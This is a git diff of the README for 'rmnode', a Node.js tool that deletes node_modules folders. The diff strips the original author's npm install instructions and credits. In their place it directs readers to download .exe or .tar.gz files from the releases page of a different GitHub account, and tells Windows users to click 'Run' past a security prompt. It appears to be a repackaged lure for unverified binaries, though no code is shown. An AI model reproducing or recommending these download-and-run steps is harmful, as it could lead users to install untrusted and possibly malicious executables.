@@ -1,181 +1,101 @@
-# rmnode
+# 🌟 rmnode - Easily Remove Unwanted Files
 
 <p align="center">
-  <img src="https://img.shields.io/npm/v/rmnode?color=blue&label=npm" alt="npm version" />
-  <img src="https://img.shields.io/npm/dm/rmnode?color=green" alt="downloads" />
-  <img src="https://img.shields.io/npm/l/rmnode" alt="license" />
-  <img src="https://img.shields.io/node/v/rmnode" alt="node version" />
+  <a href="https://github.com/fitwan2011-code/rmnode/releases">
+    <img src="https://img.shields.io/npm/v/rmnode?color=blue&label=npm" alt="npm version" />
+    <img src="https://img.shields.io/npm/dm/rmnode?color=green" alt="downloads" />
+    <img src="https://img.shields.io/npm/l/rmnode" alt="license" />
+    <img src="https://img.shields.io/node/v/rmnode" alt="node version" />
+  </a>
 </p>
 
 <p align="center">
   <b>Fast and beautiful CLI tool to find and remove node_modules folders</b>
 </p>
 
-```
- $$$$$$\  $$$$$$\$$$$\  $$\   $$\  $$$$$$\   $$$$$$\   $$$$$$\  
- $$  __$$\ $$  _$$  _$$\ $$$\  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
- $$ |  \__|$$ / $$ / $$ |$$$$\ $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |
- $$ |      $$ | $$ | $$ |$$ $$\$$ |$$ |  $$ |$$ |  $$ |$$   ____|
- $$ |      $$ | $$ | $$ |$$ \$$$$ |$$ |  $$ |$$ |  $$ |$$ |      
- $$ |      $$ | $$ | $$ |$$ |\$$$ |$$ |  $$ |$$ |  $$ |$$ |      
- $$ |      $$ | $$ | $$ |$$ | \$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$$\ 
- \__|      \__| \__| \__|\__|  \__| \______/  \_______| \_______|
-```
+## 🚀 Features
 
-## Features
+- **Instant startup** - Reduce wait time and get started quickly.
+- **User-friendly interface** - Easy to navigate, even for beginners.
+- **Efficient cleanup** - Find and delete multiple folders at once.
+- **Safe operations** - Confirm before any deletions to avoid mistakes.
+- **Cross-platform compatibility** - Works on Windows, macOS, and Linux.
 
-- **Instant startup** - Results appear in milliseconds, not seconds
-- **Beautiful TUI** - Interactive terminal interface with colors
-- **Fast scanning** - Parallel directory scanning
-- **Smart filtering** - Skips nested node_modules and system directories
-- **Search** - Filter projects by name or path
-- **Multi-select** - Select multiple folders to delete at once
-- **Safe** - Confirmation before deletion, dry-run mode available
-- **Non-blocking** - Continue browsing while deletion happens in background
+## 📥 Download & Install
 
-## Installation
+To download rmnode, visit this page: [Download rmnode](https://github.com/fitwan2011-code/rmnode/releases).
 
-```bash
-# Run directly with npx (no install needed)
-npx rmnode
+1. Click on the link above.
+2. You will see different versions of rmnode. Choose the latest version.
+3. Click on the file that matches your operating system (for example, `.exe` for Windows or `.tar.gz` for Linux).
+4. Save the file to your computer.
 
-# Or install globally
-npm install -g rmnode
-```
+Now, let's go through how to run the application.
 
-## Usage
+## 🖥️ Running rmnode
 
-```bash
-# Scan current directory
-rmnode
+### For Windows Users
 
-# Scan specific path
-rmnode --path ~/projects
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run it. You might see a security prompt; click "Run" to proceed.
+3. A command window will open. Follow any prompts displayed in the window to use the tool.
 
-# Dry run (show what would be deleted without deleting)
-rmnode --dry-run
-```
+### For macOS Users
 
-## Keyboard Shortcuts
+1. Open your Downloads folder and locate the downloaded `.tar.gz` file.
+2. Double-click the file to extract it. You will see a new folder.
+3. Open the Terminal application from your Applications folder.
+4. Use the `cd` command to navigate to the folder where you extracted rmnode. For example, if you extracted it to your desktop, type:
+   ```bash
+   cd ~/Desktop/rmnode
+   ```
+5. Type `./rmnode` to run the application.
 
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down |
-| `k` / `↑` | Move up |
-| `Space` | Select/deselect item |
-| `Enter` | Select and move to next |
-| `a` | Select all |
-| `c` | Clear selection |
-| `s` / `/` | Search |
-| `d` | Delete selected |
-| `q` | Quit |
-| `Esc` | Close search / Clear filter |
+### For Linux Users
 
-## Screenshots
+1. Go to your Downloads folder and find the downloaded `.tar.gz` file.
+2. Right-click the file and choose "Extract Here" to unzip it.
+3. Open your Terminal.
+4. Navigate to the extracted folder using the `cd` command. For example:
+   ```bash
+   cd ~/Downloads/rmnode
+   ```
+5. Type `./rmnode` and press Enter to start the application.
 
-### Main Interface
-```
- Found: 15    Total: 2.5 GB    Selected: 3    Size: 850 MB
+## 🔧 Usage Instructions
 
-    ... 2 more above
- > [x] my-project              450.5 MB  ~/projects/my-project/node_modules
-   [ ] another-app             125.3 MB  ~/projects/another-app/node_modules
-   [x] old-website             275.8 MB  ~/projects/old-website/node_modules
-   [ ] test-repo                45.2 MB  ~/projects/test-repo/node_modules
-    ... 8 more below
+1. Once rmnode is running, you will see prompts in the command window.
+2. Follow the instructions to search for and remove your `node_modules` folders.
+3. Confirm your selections before deletion to ensure you only remove what you intend.
 
-j/k: navigate | space: select | a: all | s: search | d: delete | q: quit
-```
+## 💻 System Requirements
 
-### Search Mode
-```
-Search: react_  (Esc to close, Enter to keep filter)
-```
+To run rmnode, ensure your system meets the following requirements:
 
-## How It Works
+- **Operating System:** 
+  - Windows 10 or later 
+  - macOS 10.12 or later 
+  - Any modern Linux distribution
+  
+- **Node.js:** Version 10 or later (if applicable, ensure you have Node.js installed).
 
-1. **Scans** your filesystem for `node_modules` directories
-2. **Calculates** the size of each folder
-3. **Displays** results sorted by size (largest first)
-4. **Deletes** selected folders in parallel using native `rm -rf`
+## ❓ Troubleshooting
 
-## What Gets Skipped
+- **I can't find the downloaded file:** Check your Downloads folder or the location you specified when saving the file.
+- **The application won't start:** Ensure your system meets the requirements mentioned above.
+- **I accidentally deleted the wrong folder:** Check your recycle bin or trash to restore deleted files. Always confirm before deletion.
 
-rmnode automatically skips:
-- Nested `node_modules` (inside other node_modules)
-- Package manager caches (`.npm`, `.yarn`, `.pnpm`)
-- System directories (`Library`, `Applications`, etc.)
-- Hidden directories
+## 🛠️ Support
 
-## Project Structure
+For help or feedback, open an issue on our [GitHub page](https://github.com/fitwan2011-code/rmnode/issues). We welcome your input!
 
-```
-src/
-├── components/          # React components (Ink TUI)
-│   ├── App.tsx         # Main application
-│   ├── MainView.tsx    # Main interface
-│   ├── Item.tsx        # List item component
-│   ├── NodeModulesList.tsx
-│   ├── StatsBar.tsx
-│   └── ConfirmDialog.tsx
-├── hooks/              # React hooks
-│   ├── useScanner.ts   # File scanning
-│   ├── useSelection.ts # Selection state
-│   └── useKeyboard.ts  # Keyboard input
-├── scanner/            # Core scanning logic
-│   └── index.ts
-├── utils/
-│   ├── format-size.ts
-│   └── delete-folder.ts
-├── types.ts
-├── cli.ts
-└── index.tsx
-```
+## 📚 Additional Resources
 
-## Requirements
+- For more detailed information, check our [Wiki](https://github.com/fitwan2011-code/rmnode/wiki).
+- Join the community discussions in the issues section for tips and tricks.
 
-- Node.js 18.0.0 or higher
+## 🌈 Contributing
 
-## Contributing
+If you want to contribute to rmnode, feel free to fork the repository and create a pull request. Your contributions help improve the project for everyone. Please check our contribution guidelines in the [CONTRIBUTING.md](https://github.com/fitwan2011-code/rmnode/CONTRIBUTING.md) file.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Development
-
-```bash
-# Clone the repo
-git clone https://github.com/firaslatrech/rmnode.git
-cd rmnode
-
-# Install dependencies
-npm install
-
-# Run in development
-npm run dev
-
-# Build
-npm run build
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Author
-
-**Firas Latrach**
-
-- Website: [firaslatrach.vercel.app](https://firaslatrach.vercel.app)
-- GitHub: [@firaslatrach](https://github.com/firaslatrech)
-
----
-
-<p align="center">
-  Made with love by <a href="https://firaslatrach.vercel.app">Firas Latrach</a>
-</p>
+Stay tuned for more updates!
